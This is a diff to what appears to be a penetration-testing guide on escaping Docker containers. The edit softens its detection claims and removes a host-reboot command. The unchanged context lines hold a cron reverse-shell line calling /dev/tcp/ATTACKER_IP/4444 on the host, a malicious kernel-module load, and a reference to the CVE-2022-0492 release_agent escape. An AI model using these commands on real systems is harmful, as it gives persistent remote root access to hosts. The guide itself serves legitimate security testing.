@@ -8,19 +8,17 @@ container isolation to reach the host.
 ## Quick Detection: Am I in a Container?
 
 ```bash
-# Definitive checks
+# Indicators, not proof; absent markers are inconclusive
 ls -la /.dockerenv 2>/dev/null && echo "Docker"
 cat /proc/1/cgroup 2>/dev/null | grep -qiE 'docker|kubepods|containerd' && echo "Container"
 cat /proc/self/mountinfo | grep -q 'overlay' && echo "OverlayFS (likely container)"
 
 # Environment clues
-env | grep -iE 'kubernetes|docker|container'
-hostname  # random hex = Docker, <pod-name> = k8s
+hostname  # naming conventions alone do not identify the runtime
 
 # What capabilities do I have?
 cat /proc/self/status | grep -i capeff
-# CapEff: 00000000a80425fb = restricted
-# CapEff: 0000003fffffffff = privileged (nearly all caps)
+# Decode for this kernel and user namespace; a mask does not prove privileged mode.
 
 # capsh for human-readable output
 capsh --print 2>/dev/null
@@ -30,8 +28,8 @@ capsh --print 2>/dev/null
 
 ## 1. Docker Socket Mount
 
-If `/var/run/docker.sock` is mounted into the container, you have full control of the Docker
-daemon on the host - effectively root.
+A writable Docker socket may grant control of its daemon. Host-root impact depends on
+whether that daemon is rootful, which host it controls, and its authorization policy.
 
 ```bash
 # Check
@@ -63,17 +61,16 @@ curl -s http://HOST_IP:2376/version 2>/dev/null
 
 ## 2. Privileged Container Escape
 
-If running with `--privileged` or all capabilities, the container has nearly full host access.
+Rootful privileged mode is high risk. User namespaces, rootless operation, device access,
+and security policy still affect the actual boundary; all capabilities alone are not proof.
 
 ### Detection
 
 ```bash
-ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
-# Unprivileged containers can't create network interfaces
-
-# Or check capabilities
-grep CapEff /proc/self/status
-# 0000003fffffffff = all caps = privileged
+grep -E 'CapEff|CapBnd|NoNewPrivs|Seccomp' /proc/self/status
+cat /proc/self/uid_map
+# Confirm mode and device exposure from runtime configuration.
+# Creating an interface only tests NET_ADMIN in that network namespace.
 ```
 
 ### Escape via Host Disk Mount
@@ -104,12 +101,7 @@ echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc
 insmod /tmp/evil.ko
 ```
 
-### Escape via /proc/sysrq-trigger
-
-```bash
-# With privileged access, can trigger kernel functions
-echo b > /proc/sysrq-trigger  # CAUTION: reboots the host
-```
+Host reboot commands are destructive operations, not escape verification.
 
 ---
 
@@ -117,7 +109,8 @@ echo b > /proc/sysrq-trigger  # CAUTION: reboots the host
 
 ### SYS_ADMIN - cgroup v1 release_agent (CVE-2022-0492)
 
-The classic container escape. Requires cgroup v1 and SYS_ADMIN capability.
+This path depends on cgroup v1, relevant namespace privileges, writable controller files,
+and kernel/runtime configuration. SYS_ADMIN alone does not establish those preconditions.
 
 ```bash
 # Check cgroup version
